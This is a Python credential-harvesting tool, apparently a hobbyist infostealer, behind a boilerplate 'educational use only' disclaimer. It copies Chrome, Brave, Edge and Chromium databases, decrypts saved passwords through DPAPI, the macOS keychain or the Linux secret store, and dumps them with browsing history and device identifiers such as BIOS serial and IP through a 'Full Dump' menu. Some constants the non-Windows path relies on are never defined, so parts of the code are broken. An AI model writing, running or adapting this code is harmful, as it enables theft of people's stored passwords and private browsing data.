"""
LEGAL USAGE DISCLAIMER

This software is provided for educational and authorized use only.

By using or distributing this tool, you agree to:

- Use it only on computers and devices you own or have explicit permission to test.
- Not use it to access, steal, modify, or damage data on any system without proper authorization.
- Comply with all applicable laws and regulations regarding computer security and privacy.

Unauthorized use, hacking, or distribution of this software for malicious purposes is strictly prohibited and may result in criminal and civil penalties.

The author is not responsible for any misuse or damages caused by this software.

                                                                                            ~Meowmet
"""


import os
import sys
import uuid
import platform
import socket
import shutil
import sqlite3
import json
import base64
import tempfile
import subprocess
from datetime import datetime, timedelta, timezone
from collections import Counter
from urllib.parse import urlparse
from tzlocal import get_localzone
from colorama import init as colorama_init, Fore, Style
from tabulate import tabulate

colorama_init(autoreset=True)

IS_WINDOWS = platform.system() == 'Windows'
APP_DATA_PATH = os.environ.get('LOCALAPPDATA' if IS_WINDOWS else 'HOME', os.getcwd())
LOCAL_TZ = get_localzone()
MIN_CHROME_TS = 11644473600000000
OUTPUT_DIR = os.path.join(os.getcwd(), 'outputs', datetime.now().strftime('%Y-%m-%d'))

BROWSERS = {
    'chrome': os.path.join(APP_DATA_PATH, 'Google', 'Chrome', 'User Data'),
    'brave': os.path.join(APP_DATA_PATH, 'BraveSoftware', 'Brave-Browser'),
    'edge': os.path.join(APP_DATA_PATH, 'Microsoft', 'Edge', 'User Data'),
    'chromium': os.path.join(APP_DATA_PATH, 'Chromium', 'User Data'),
}

if IS_WINDOWS:
    import win32crypt
else:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def banner():
    """Print ASCII banner"""
    art = r"""
========================================
   Terminal Data Extractor v2.0 by Meowmet
========================================
"""
    print(Fore.CYAN + art)


def ensure_output_dir():
    os.makedirs(OUTPUT_DIR, exist_ok=True)


def prompt_menu():
    print(Fore.YELLOW + "What do you want to extract?")
    print("1. Passwords Only")
    print("2. History Only")
    print("3. Passwords + History + Device Info")
    print("4. Device Info Only")
    print("5. Full Dump (All Browsers, All Info)")
    print("6. Exit")
    return input(Fore.YELLOW + "Enter choice (1-6): ").strip()


def ask_save_options(data_str):
    print(Fore.GREEN + "\nSave options:")
    print("1. Back to menu")
    print("2. Save as TXT")
    print("3. Save as JSON")
    print("4. Exit")
    choice = input(Fore.GREEN + "Enter (1-4): ").strip()
    if choice == '2':
        path = os.path.join(OUTPUT_DIR, f'result_{datetime.now().strftime("%H%M%S")}.txt')
        with open(path, 'w', encoding='utf-8') as f: f.write(data_str)
        print(Fore.GREEN + f"Saved to {path}")
    elif choice == '3':
        path = os.path.join(OUTPUT_DIR, f'result_{datetime.now().strftime("%H%M%S")}.json')
        with open(path, 'w', encoding='utf-8') as f: f.write(data_str)
        print(Fore.GREEN + f"Saved to {path}")
    elif choice == '4':
        print(Fore.BLUE + "Exiting...")
        sys.exit(0)


def convert_chrome_time(ts):
    if ts and ts > MIN_CHROME_TS:
        dt = datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=ts)
        return dt.astimezone(LOCAL_TZ)
    return None


def copy_db(src):
    if not os.path.exists(src): return None
    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.close()
    shutil.copy2(src, tmp.name)
    return tmp.name


def safe_remove(path):
    try: os.remove(path)
    except: pass


def get_history_logs(path, days_filter=None):
    logs=[]; tmp=copy_db(path)
    if not tmp: return logs
    cutoff = None
    if days_filter:
        cutoff = datetime.now(LOCAL_TZ)-timedelta(days=days_filter)
    try:
        with sqlite3.connect(tmp) as conn:
            q="SELECT url,title,last_visit_time FROM urls ORDER BY last_visit_time DESC"
            for url,title,ts in conn.execute(q):
                dt=convert_chrome_time(ts)
                if dt and (not cutoff or dt>cutoff):
                    logs.append(f"[{dt.strftime('%Y-%m-%d %H:%M:%S')}] {title} -> {url}")
                if len(logs)>=20: break
    except: pass
    finally: safe_remove(tmp)
    return logs


def extract_most_visited_sites(path, top_n=5):
    tmp=copy_db(path)
    if not tmp: return []
    domains=[]
    try:
        with sqlite3.connect(tmp) as conn:
            for (url,) in conn.execute("SELECT url FROM urls"):
                h=urlparse(url).hostname or ""
                if h.startswith('www.'): h=h[4:]
                domains.append(h.lower())
    except: pass
    finally: safe_remove(tmp)
    counter=Counter(domains).most_common(top_n)
    return [ (dom,cnt) for dom,cnt in counter ]


def get_master_key(state_path):
    if not os.path.exists(state_path): return None
    try:
        js=json.load(open(state_path,'r',encoding='utf-8'))
        b64=js.get('os_crypt',{}).get('encrypted_key','')
        raw=base64.b64decode(b64)[5:]
        if IS_WINDOWS: return win32crypt.CryptUnprotectData(raw,None,None,None,0)[1]
        return raw
    except: return None


def get_safe_storage_key(browser):
    if IS_WINDOWS: return None
    name_map={'chrome':'chrome','brave':'chrome','edge':'microsoft-edge','chromium':'chromium'}
    svc=name_map.get(browser)
    if not svc: return None
    if platform.system()=='Darwin': return subprocess.getoutput(f'security find-generic-password -w -s "{svc}"')
    return subprocess.getoutput(f'secret-tool lookup application "{svc}"')


def decrypt_password(blob, master_key=None, safe_key=None):
    if not blob: return None
    data=blob.tobytes() if isinstance(blob,memoryview) else blob
    if master_key and data.startswith(b'v10'):
        try:
            nonce,rest=data[3:15],data[15:]
            ct,tag=rest[:-16],rest[-16:]
            cipher=Cipher(algorithms.AES(master_key),modes.GCM(nonce,tag),backend=default_backend())
            return cipher.decryptor().update(ct).decode('utf-8',errors='replace')
        except: return None
    if IS_WINDOWS:
        try: return win32crypt.CryptUnprotectData(data,None,None,None,0)[1].decode()
        except: return None
    if safe_key:
        try:
            iv=b' '*16
            it=ITER_MAC if platform.system()=='Darwin' else ITER_LIN
            key=PBKDF2(safe_key,SALT,dkLen=16,count=it)
            cipher=AES.new(key,AES.MODE_CBC,iv)
            dec=cipher.decrypt(data)
            pad=dec[-1]
            return dec[:-pad].decode('utf-8',errors='replace')
        except: return None
    return None


def extract_passwords(path, master_key, safe_key):
    out=[]; tmp=os.path.join(tempfile.gettempdir(),'LoginData.db')
    if not os.path.exists(path): return out
    shutil.copyfile(path,tmp); seen=set()
    try:
        with sqlite3.connect(tmp) as conn:
            for url,user,blob in conn.execute("SELECT origin_url,username_value,password_value FROM logins"):
                if not user: continue
                pwd=decrypt_password(blob,master_key,safe_key)
                if not pwd: continue
                key=(url,user,pwd)
                if key in seen: continue
                seen.add(key)
                out.append((url,user,pwd))
    except: pass
    finally: safe_remove(tmp)
    return out


def get_device_info():
    info={
        'OS':platform.system(),
        'OS Version':platform.version(),
        'Architecture':platform.machine(),
        'Processor':platform.processor(),
        'UUID':hex(uuid.getnode()),
        'Hostname':socket.gethostname(),
        'IP Address':socket.gethostbyname(socket.gethostname()),
        'RAM (GB)':round(psutil.virtual_memory().total/(1024**3),2),
        'Language':os.environ.get('LANG','N/A'),
        'Time Zone':str(LOCAL_TZ)
    }
    try:
        bios=subprocess.check_output('wmic bios get serialnumber',shell=True).decode().split('\n')[1].strip()
        board=subprocess.check_output('wmic baseboard get product',shell=True).decode().split('\n')[1].strip()
        info['BIOS Serial']=bios; info['Mainboard']=board
    except: pass
    return info


def format_device_table(info):
    return tabulate(info.items(), headers=['Property','Value'], tablefmt='grid')


def filter_days():
    ans=input(Fore.MAGENTA+"Filter history by last N days? [y/N]: ").strip().lower()
    if ans=='y':
        try: return int(input("Enter number of days: ").strip())
        except: return None
    return None


def process_choice(choice):
    data={}
    days=filter_days() if choice in ['2','3','5'] else None
    for name,path in BROWSERS.items():
        profile=os.path.join(path,'Default')
        history_db=os.path.join(profile,'History')
        login_db=os.path.join(profile,'Login Data')
        state=os.path.join(path,'Local State')
        mk=get_master_key(state)
        sk=get_safe_storage_key(name)
        section={}
        if choice in ['1','3','5']:
            section['passwords']=extract_passwords(login_db,mk,sk)
        if choice in ['2','3','5']:
            section['history_logs']=get_history_logs(history_db,days)
            section['top_sites']=extract_most_visited_sites(history_db)
        data[name]=section
    if choice in ['3','4','5']:
        data['device_info']=get_device_info()
    return data


def main():
    banner(); ensure_output_dir()
    while True:
        choice = prompt_menu()
        if choice == '6':
            print(Fore.BLUE + "Exiting...")
            sys.exit(0)
        if choice not in [str(i) for i in range(1, 6)]:
            print(Fore.RED + "Invalid!")
            continue
        result = process_choice(choice)
        print(Fore.CYAN + json.dumps(result, indent=2, ensure_ascii=False))
        ask_save_options(json.dumps(result, indent=2, ensure_ascii=False))
if __name__=='__main__':
    try: import psutil
    except ImportError:
        print(Fore.RED+"Missing dependency psutil. Install via: pip install psutil tzlocal pywin32 colorama tabulate")
        sys.exit(1)
    main()